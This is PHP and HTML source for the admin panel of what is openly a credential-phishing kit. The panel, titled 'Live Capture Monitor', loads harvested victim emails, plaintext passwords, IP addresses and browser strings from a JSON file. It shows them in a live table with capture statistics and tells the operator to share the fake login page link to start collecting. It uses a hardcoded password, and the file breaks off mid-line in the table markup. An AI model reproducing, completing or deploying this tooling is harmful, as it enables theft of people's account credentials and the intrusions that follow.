<?php
// admin.php - Live-updating admin panel

session_start();
$adminPassword = 'admin123'; // Change this!

// Handle login
if (isset($_POST['admin_password'])) {
    if ($_POST['admin_password'] === $adminPassword) {
        $_SESSION['admin_logged_in'] = true;
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit();
}

// Handle data deletion
if (isset($_POST['delete_id']) && isset($_SESSION['admin_logged_in'])) {
    $dataFile = 'captured_data.json';
    if (file_exists($dataFile)) {
        $data = json_decode(file_get_contents($dataFile), true) ?: [];
        $deleteId = $_POST['delete_id'];
        unset($data[$deleteId]);
        file_put_contents($dataFile, json_encode(array_values($data), JSON_PRETTY_PRINT));
    }
}

// Handle clear all
if (isset($_POST['clear_all']) && isset($_SESSION['admin_logged_in'])) {
    $dataFile = 'captured_data.json';
    file_put_contents($dataFile, json_encode([], JSON_PRETTY_PRINT));
}

$isLoggedIn = isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;

// Load captured data
$dataFile = 'captured_data.json';
$capturedData = [];
if (file_exists($dataFile)) {
    $capturedData = json_decode(file_get_contents($dataFile), true) ?: [];
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Live Capture Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #0f1419;
            color: #e7e9ea;
            min-height: 100vh;
        }

        .header {
            background: #1a1f24;
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #2f3336;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header h1 {
            font-size: 1.5rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .live-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        .container {
            max-width: 1400px;
            margin: 2rem auto;
            padding: 0 1rem;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .stat-card {
            background: #1a1f24;
            border: 1px solid #2f3336;
            border-radius: 12px;
            padding: 1.5rem;
            transition: all 0.3s;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        }

        .stat-value {
            font-size: 2.5rem;
            font-weight: 700;
            color: #1d9bf0;
            margin-bottom: 0.5rem;
        }

        .stat-label {
            color: #71767b;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .data-table {
            background: #1a1f24;
            border: 1px solid #2f3336;
            border-radius: 12px;
            overflow: hidden;
        }

        .table-header {
            padding: 1rem 1.5rem;
            background: #1a1f24;
            border-bottom: 1px solid #2f3336;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            padding: 1rem;
            background: #1a1f24;
            color: #71767b;
            font-size: 0.85rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid #2f3336;
        }

        td {
            padding: 1rem;
            border-bottom: 1px solid #2f3336;
        }

        tr:hover {
            background: #1a1f24;
        }

        .password-text {
            font-family: 'Courier New', monospace;
            color: #ff6b6b;
            letter-spacing: 1px;
        }

        .ip-badge {
            background: #1d9bf0;
            color: white;
            padding: 0.2rem 0.6rem;
            border-radius: 4px;
            font-size: 0.85rem;
        }

        .delete-btn {
            background: #ff4444;
            color: white;
            border: none;
            padding: 0.4rem 0.8rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: 0.2s;
        }

        .delete-btn:hover {
            background: #cc0000;
        }

        .clear-all-btn {
            background: #ff4444;
            color: white;
            border: none;
            padding: 0.6rem 1.2rem;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.2s;
        }

        .clear-all-btn:hover {
            background: #cc0000;
        }

        .login-form {
            max-width: 400px;
            margin: 100px auto;
            background: #1a1f24;
            padding: 2rem;
            border-radius: 12px;
            border: 1px solid #2f3336;
        }

        .login-form h2 {
            margin-bottom: 1.5rem;
            color: #e7e9ea;
        }

        .login-form input {
            width: 100%;
            padding: 0.8rem;
            margin-bottom: 1rem;
            background: #0f1419;
            border: 1px solid #2f3336;
            border-radius: 6px;
            color: #e7e9ea;
            font-size: 1rem;
        }

        .login-form button {
            width: 100%;
            padding: 0.8rem;
            background: #1d9bf0;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }

        .login-form button:hover {
            background: #1a8cd8;
        }

        .empty-state {
            text-align: center;
            padding: 4rem;
            color: #71767b;
        }

        .empty-state i {
            font-size: 4rem;
            margin-bottom: 1rem;
        }

        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            table {
                font-size: 0.85rem;
            }
            
            th, td {
                padding: 0.75rem;
            }
        }
    </style>
</head>
<body>
    <?php if (!$isLoggedIn): ?>
        <div class="login-form">
            <h2><i class="fas fa-lock"></i> Admin Login</h2>
            <form method="POST">
                <input type="password" name="admin_password" placeholder="Enter admin password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    <?php else: ?>
        <div class="header">
            <h1>
                <span class="live-indicator"></span>
                Live Capture Monitor
            </h1>
            <div>
                <form method="POST" style="display: inline;">
                    <button type="submit" name="clear_all" class="clear-all-btn" onclick="return confirm('Clear all data?')">
                        <i class="fas fa-trash"></i> Clear All
                    </button>
                </form>
                <a href="?logout=true" class="delete-btn" style="margin-left: 1rem; text-decoration: none;">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>

        <div class="container">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value"><?php echo count($capturedData); ?></div>
                    <div class="stat-label">Total Captures</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">
                        <?php 
                        $today = date('Y-m-d');
                        $todayCount = 0;
                        foreach ($capturedData as $data) {
                            $dataDate = isset($data['server_time']) ? date('Y-m-d', strtotime($data['server_time'])) : '';
                            if ($dataDate === $today) $todayCount++;
                        }
                        echo $todayCount;
                        ?>
                    </div>
                    <div class="stat-label">Today's Captures</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">
                        <?php 
                        $uniqueIPs = [];
                        foreach ($capturedData as $data) {
                            if (isset($data['ip_address'])) {
                                $uniqueIPs[$data['ip_address']] = true;
                            }
                        }
                        echo count($uniqueIPs);
                        ?>
                    </div>
                    <div class="stat-label">Unique Visitors</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">
                        <?php 
                        $browsers = [];
                        foreach ($capturedData as $data) {
                            if (isset($data['userAgent'])) {
                                $browsers[] = $data['userAgent'];
                            }
                        }
                        echo count(array_unique($browsers));
                        ?>
                    </div>
                    <div class="stat-label">Unique Browsers</div>
                </div>
            </div>

            <div class="data-table">
                <div class="table-header">
                    <span><i class="fas fa-list"></i> Captured Credentials</span>
                    <span>Last update: <?php echo date('H:i:s'); ?></span>
                </div>
                <?php if (empty($capturedData)): ?>
                    <div class="empty-state">
                        <i class="fas fa-inbox"></i>
                        <p>No data captured yet. Share the login page link to start collecting.</p>
                    </div>
                <?php else: ?>
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Email</th>
                                <th>Password</th>
                                <th>IP Address</th>
                                <th>User Agent</th>
                                <th>Timestamp</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach (array_reverse($capturedData) as $index => $data): ?>
                                <tr>
                                    <td><?php echo count($capturedData) - $index; ?></td>
                                    <td><?php echo htmlspecialchars($data['email'] ?? 'N/A'); ?></td>
                                    <td class="password-text"><?php echo htmlspecialchars($data['password'] ?? 'N/A'); ?></td>
                                    <td><span class="ip-badge"><?php echo htmlspecialchars($data['ip
